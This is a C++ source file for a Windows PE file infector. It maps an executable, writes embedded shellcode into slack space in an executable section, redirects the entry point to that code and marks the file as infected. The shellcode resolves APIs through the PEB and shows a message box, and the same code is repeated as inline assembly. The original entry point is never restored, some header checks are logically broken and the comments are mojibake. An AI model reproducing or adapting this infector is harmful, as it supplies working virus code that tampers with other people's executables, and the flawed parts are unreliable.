// Prog.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include "windows.h"
#include "stdio.h"

#pragma data_seg(".Shard")
volatile int nInstance=1;
#pragma data_seg()

/////////////////////////////////////////////////////////////////////////
////����ѡ��
/////////////////////////////////////////////////////////////////////////
#pragma comment(linker,"/SECTION:.Shard,RWS")

/////////////////////////////////////////////////////////////////////////
////��������
/////////////////////////////////////////////////////////////////////////
DWORD APIENTRY InflectImgFile(PVOID pvAddress);
DWORD APIENTRY RVAToOffSet(PVOID pvFileHeader,DWORD dwRVA);
DWORD APIENTRY GetSizeFileAlig(DWORD dwSize,const DWORD dwFileAlig);
DWORD APIENTRY GetShellCodeLen(unsigned char * pcShellCode);

/////////////////////////////////////////////////////////////////////////
////ȫ�ֱ�������
/////////////////////////////////////////////////////////////////////////
unsigned char shellcode[]="\x8b"
"\xec\x83\xc4\xf8\x64\xa1\x30\x00\x00\x00\x8b\x40\x0c\x8b\x70"
"\x1c\xad\x8b\x40\x08\x89\x45\x00\x8b\xf0\x8b\xf8\x03\x7e\x3c"
"\x03\x47\x78\x8b\xf8\x8b\x48\x18\x8b\x58\x20\x03\xde\x49\x8b"
"\x34\x8b\x03\x75\x00\xb8\x47\x65\x74\x50\x39\x06\x75\xf0\xb8"
"\x72\x6f\x63\x41\x39\x46\x04\x75\xe6\x8b\x5f\x24\x03\x5d\x00"
"\x0f\xb7\x0c\x4b\x8b\x5f\x1c\x03\x5d\x00\x8b\x04\x8b\x03\x45"
"\x00\x89\x45\xfc\x6a\x00\x68\x61\x72\x79\x41\x68\x4c\x69\x62"
"\x72\x68\x4c\x6f\x61\x64\x54\xff\x75\x00\xff\x55\xfc\x68\x6c"
"\x6c\x00\x00\x68\x33\x32\x2e\x64\x68\x75\x73\x65\x72\x54\xff"
"\xd0\x68\x6f\x78\x41\x00\x68\x61\x67\x65\x42\x68\x4d\x65\x73"
"\x73\x54\x50\xff\x55\xfc\x6a\x65\x68\x6c\x43\x6f\x64\x68\x53"
"\x68\x65\x6c\x6a\x04\x8d\x74\x24\x04\x56\x8d\x74\x24\x08\x56"
"\x6a\x00\xff\xd0\x8b\xe5\xe9\xcc";

int main(int argc, char* argv[])
{
	HANDLE hFile = CreateFile(TEXT("E:\\1.EXE"),
		GENERIC_READ|GENERIC_WRITE,
		0,
		NULL,
		OPEN_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,NULL);
	if(hFile==INVALID_HANDLE_VALUE){
		printf("Open File Failed...\n");
		return -1;
	}
	HANDLE hFileMapping = CreateFileMapping(hFile,
		NULL,
		PAGE_READWRITE,0,0,NULL);
	if(hFileMapping==NULL){
		printf("Create File Mapping Failed .\n");
		CloseHandle(hFile);
		return -1;
	}
	PVOID pvAddress = MapViewOfFile(hFileMapping,
		FILE_MAP_WRITE,
		0,0,0);
	if(pvAddress==NULL){
		printf("MapViewOfFile Failed .\n");
		CloseHandle(hFileMapping);
		CloseHandle(hFile);
		return -1;
	}
	InflectImgFile(pvAddress);
	UnmapViewOfFile(pvAddress);
	CloseHandle(hFileMapping);
	CloseHandle(hFile);
	return 0;
}

DWORD APIENTRY InflectImgFile(PVOID pvAddress)
{
	/////////////////////////////////////////////////////////////////////////
	////�������
	/////////////////////////////////////////////////////////////////////////
	PBYTE pbCurPointer=(PBYTE)pvAddress;
	DWORD dwShellCodeLen=GetShellCodeLen(shellcode);
	PIMAGE_DOS_HEADER pstImgDosHeader=(PIMAGE_DOS_HEADER)pvAddress;
	/////////////////////////////////////////////////////////////////////////
	////�жϸ��ļ��Ƿ񱻸�Ⱦ��
	/////////////////////////////////////////////////////////////////////////
	if(*(DWORD*)pstImgDosHeader->e_res&0x7970534B)
	{
		/////////////////////////////////////////////////////////////////////////
		////������ļ�����Ⱦ��,���������ļ�
		/////////////////////////////////////////////////////////////////////////
		return 0;

	}
	/////////////////////////////////////////////////////////////////////////
	////���PE�ļ�DOS Header�� MZ��־
	/////////////////////////////////////////////////////////////////////////
	if(pstImgDosHeader->e_magic&IMAGE_DOS_SIGNATURE)
	{
		pbCurPointer+=pstImgDosHeader->e_lfanew;
		PIMAGE_NT_HEADERS pstImgNtHeader=(PIMAGE_NT_HEADERS)pbCurPointer;
		/////////////////////////////////////////////////////////////////////////
		////���PE�ļ�PE Header�� PE ��־ 
		/////////////////////////////////////////////////////////////////////////
		if(pstImgNtHeader->Signature&IMAGE_NT_SIGNATURE)
		{
			PIMAGE_SECTION_HEADER pstImgSecHeader=(PIMAGE_SECTION_HEADER)(pbCurPointer+sizeof(IMAGE_NT_HEADERS));
			/////////////////////////////////////////////////////////////////////////
			////ѭ��ɨ��ڱ�,�Ѵ�����뵽���п�ִ�����ԵĽ���
			/////////////////////////////////////////////////////////////////////////
			u_int nNumberOfSections=pstImgNtHeader->FileHeader.NumberOfSections;
			while(nNumberOfSections--)
			{
				/////////////////////////////////////////////////////////////////////////
				////�����ǰ�ڰ���δ��ʼ������������
				/////////////////////////////////////////////////////////////////////////
				if(pstImgSecHeader->Characteristics&IMAGE_SCN_CNT_UNINITIALIZED_DATA)
				{
						pstImgSecHeader++;
						continue;
				}
				/////////////////////////////////////////////////////////////////////////
				////����ý���ӳ�䵽�ڴ���ҳ���ִ��,������������FileAlignment������ʣ��ռ�
				/////////////////////////////////////////////////////////////////////////
				if(pstImgSecHeader->Characteristics&IMAGE_SCN_MEM_EXECUTE)
				{
					DWORD dwFreeBlockSize=pstImgSecHeader->SizeOfRawData-pstImgSecHeader->Misc.VirtualSize;
					/////////////////////////////////////////////////////////////////////////
					////����ý��������ļ���������λ�÷Ų������룬�������һ������
					/////////////////////////////////////////////////////////////////////////
					if(dwFreeBlockSize<dwShellCodeLen+4)
					{
						printf("AddSection\n");
						break;
					}
					/////////////////////////////////////////////////////////////////////////
					////��ָ����ShellCodeд�뵱ǰ��������������PE�ļ�ͷ
					/////////////////////////////////////////////////////////////////////////
					else
					{
						/////////////////////////////////////////////////////////////////////////
						////�������������ļ�ͷ��ƫ����dwFreeBlockOffSet
						/////////////////////////////////////////////////////////////////////////
						DWORD dwFreeBlockOffSet=pstImgSecHeader->PointerToRawData+pstImgSecHeader->Misc.VirtualSize;
						PBYTE pucFreeBlock=(PBYTE)pvAddress+dwFreeBlockOffSet-1;
						//DWORD dwEntry=pstImgNtHeader->OptionalHeader.AddressOfEntryPoint;
						//dwEntry=dwEntry-(pstImgSecHeader->VirtualAddress+pstImgSecHeader->Misc.VirtualSize+dwShellCodeLen+4);
						pstImgNtHeader->OptionalHeader.AddressOfEntryPoint=pstImgSecHeader->VirtualAddress+pstImgSecHeader->Misc.VirtualSize;
						pstImgSecHeader->Misc.VirtualSize+=dwShellCodeLen;
						*(DWORD*)pstImgDosHeader->e_res=0x7970534B;
						memcpy((PVOID)pucFreeBlock,(PVOID)shellcode,dwShellCodeLen);
						//*(DWORD*)(pucFreeBlock+dwShellCodeLen)=dwEntry;
						FlushViewOfFile((LPCVOID)pucFreeBlock,dwShellCodeLen+4);
						FlushViewOfFile(pvAddress,pstImgNtHeader->OptionalHeader.SizeOfHeaders);
						break;
					}
				}
				pstImgSecHeader++;
			}
		}
	}
	return 0;
}

DWORD APIENTRY RVAToOffSet(PVOID pvFileHeader,const DWORD dwRVA)
{
	DWORD dwOffSet;
	{
		__asm		pushad
		__asm		mov		esi,pvFileHeader	
		__asm		add		esi,[esi+0x3C] 
		////////////////////////////////////////
		__asm		mov		edi,dwRVA
		__asm		mov		edx,esi					  
		__asm		add		edx,0xF8					  
		__asm		movzx	ecx,word ptr [esi+0x06]  
		////////////////////////////////////////
		__asm		looper:
		__asm		mov		eax,[edx+0x0C]		
		__asm		add		eax,[edx+0x10]		
		__asm		cmp		edi,[edx+0x0C]
		__asm		jae		more
		__asm		mov		dwOffSet,-1
		__asm		jmp		eof
		////////////////////////////////////////
		__asm		more:
		__asm		cmp		edi,eax
		__asm		jb		end
		__asm		add		edx,0x28
		__asm		loop looper
		////////////////////////////////////////
		__asm		end:
		__asm		mov		dwOffSet,edx
		__asm		mov		eax,[edx+0x0C]
		__asm		sub		edi,eax
		__asm		add		edi,[edx+0x14]
		__asm		mov		dwOffSet,edi
		__asm		eof:
		__asm		popad
	}
	return dwOffSet;
} 

__declspec(naked) VOID APIENTRY InitializeApp()
{
	__asm		pushad
	__asm		push	ecx
	__asm		push	ecx
	__asm		mov		eax,fs:[0x30]
	__asm		mov		eax,dword ptr [eax+0x0C]
	__asm		mov		esi,dword ptr [eax+0x1C]
	__asm		lodsd
	__asm		mov		eax,[eax+0x08]
	__asm		mov		dword ptr [esp+0x04],eax
	////////////////////////////////////////
	__asm		mov		esi,eax
	__asm		mov		edi,eax
	__asm		add		edi,dword ptr [esi+0x3C] 
	__asm		add		eax,dword ptr [edi+0x78]		
	__asm		mov		edi,eax
	__asm		mov		ecx,[eax+0x18]			
	__asm		mov		ebx,[eax+0x20]		
	__asm		add		ebx,esi
	/////////////////////////////////////////
	__asm		Search:
	__asm		dec		ecx
	__asm		mov		esi,dword ptr [ebx+ecx * 4]	
	__asm		add		esi,dword ptr [esp+0x04]		
	__asm		mov		eax,0x50746547
	__asm		cmp		dword ptr [esi],eax
	__asm		jne		Search
	__asm		mov		eax,0x41636F72
	__asm		cmp		dword ptr [esi+4],eax
	__asm		jne		Search
	///////////////////////////////////////// 
	__asm		mov		ebx,[edi+0x24]		
	__asm		add		ebx,dword ptr [esp+0x04]
	__asm		movzx	ecx,word ptr [ebx+ecx * 2]
	__asm		mov		ebx,[edi+0x1C]
	__asm		add		ebx,dword ptr [esp+0x04]
	__asm		mov		eax,[ebx+ecx * 4]
	__asm		add		eax,dword ptr [esp+0x04]
	__asm		mov		dword ptr [esp],eax
	__asm		push	dword ptr [esp]
	__asm		add		esp,0x08
	__asm		popad
	__asm		ret
}

DWORD APIENTRY GetSizeFileAlig(DWORD dwSize,const DWORD dwFileAlig)
{
	if(dwSize<dwFileAlig){
		dwSize=dwFileAlig;
	}else if(dwSize%dwFileAlig){
		dwSize=(dwSize-dwSize%dwFileAlig)+dwFileAlig;
	}else{
		dwSize=dwSize;
	}
	return dwSize;
}

DWORD APIENTRY GetShellCodeLen(unsigned char * pcShellCode)
{
	int nLength=0;
	while(*pcShellCode++!=0xCC)
	{
		nLength++;
	}
	return nLength;
}

/*
VOID APIENTRY InitializeApp()
{
	PVOID pvImageBase,pvProAddress;
	{
		__asm		pushad
		__asm		mov		eax,fs:[0x30]
		__asm		mov		eax,dword ptr [eax+0x0C]
		__asm		mov		esi,dword ptr [eax+0x1C]
		__asm		lodsd
		__asm		mov		eax,[eax+0x08]
		__asm		mov		pvImageBase,eax
		////////////////////////////////////////
		__asm		mov		esi,eax
		__asm		mov		edi,eax
		__asm		add		edi,dword ptr [esi+0x3C] 
		__asm		add		eax,dword ptr [edi+0x78]		
		__asm		mov		edi,eax
		__asm		mov		ecx,[eax+0x18]			
		__asm		mov		ebx,[eax+0x20]		
		__asm		add		ebx,esi
		/////////////////////////////////////////
		__asm		Search:
		__asm		dec		ecx
		__asm		mov		esi,dword ptr [ebx+ecx * 4]	
		__asm		add		esi,pvImageBase			
		__asm		mov		eax,0x50746547
		__asm		cmp		dword ptr [esi],eax
		__asm		jne		Search
		__asm		mov		eax,0x41636F72
		__asm		cmp		dword ptr [esi+4],eax
		__asm		jne		Search
		///////////////////////////////////////// 
		__asm		mov		ebx,[edi+0x24]		
		__asm		add		ebx,pvImageBase
		__asm		movzx	ecx,word ptr [ebx+ecx * 2]
		__asm		mov		ebx,[edi+0x1C]
		__asm		add		ebx,pvImageBase
		__asm		mov		eax,[ebx+ecx * 4]
		__asm		add		eax,pvImageBase
		__asm		mov		pvProAddress,eax
		__asm		popad
	}
}*/

__declspec(naked) PVOID APIENTRY StartUp()
{
	__asm		push	ebp
	__asm		mov		ebp,esp
	__asm		add		esp,0xfffffff8
	__asm		mov		eax,fs:[0x30]
	__asm		mov		eax,dword ptr [eax+0x0C]
	__asm		mov		esi,dword ptr [eax+0x1C]
	__asm		lodsd
	__asm		mov		eax,[eax+0x08]
	__asm		mov		dword ptr [ebp],eax
	////////////////////////////////////////
	__asm		mov		esi,eax
	__asm		mov		edi,eax
	__asm		add		edi,dword ptr [esi+0x3C] 
	__asm		add		eax,dword ptr [edi+0x78]		
	__asm		mov		edi,eax
	__asm		mov		ecx,[eax+0x18]			
	__asm		mov		ebx,[eax+0x20]		
	__asm		add		ebx,esi
	/////////////////////////////////////////
	__asm		Search:
	__asm		dec		ecx
	__asm		mov		esi,dword ptr [ebx+ecx * 4]	
	__asm		add		esi,dword ptr [ebp]		
	__asm		mov		eax,0x50746547
	__asm		cmp		dword ptr [esi],eax
	__asm		jne		Search
	__asm		mov		eax,0x41636F72
	__asm		cmp		dword ptr [esi+4],eax
	__asm		jne		Search
	///////////////////////////////////////// 
	__asm		mov		ebx,[edi+0x24]		
	__asm		add		ebx,dword ptr [ebp]
	__asm		movzx	ecx,word ptr [ebx+ecx * 2]
	__asm		mov		ebx,[edi+0x1C]
	__asm		add		ebx,dword ptr [ebp]
	__asm		mov		eax,[ebx+ecx * 4]
	__asm		add		eax,dword ptr [ebp]
	__asm		mov		dword ptr [ebp-0x04],eax
	__asm		push	0x00000000
	__asm		push	0x41797261
	__asm		push	0x7262694c
	__asm		push	0x64616f4c
	__asm		push	esp
	__asm		push	dword ptr [ebp]
	__asm		call	[ebp-0x04]
	__asm		push	0x00006c6c
	__asm		push	0x642e3233
	__asm		push	0x72657375
	__asm		push	esp
	__asm		call	eax
	__asm		push	0x0041786f
	__asm		push	0x42656761
	__asm		push	0x7373654d
	__asm		push	esp
	__asm		push	eax
	__asm		call	[ebp-0x04]
	__asm		push	0x00000065
	__asm		push	0x646f436c
	__asm		push	0x6c656853
	__asm		push	4
	__asm		lea		esi,[esp+4]
	__asm		push	esi
	__asm		lea		esi,[esp+8]
	__asm		push	esi
	__asm		push	0
	__asm		call	eax
	__asm		mov		esp,ebp
	__asm		pop		ebp
}
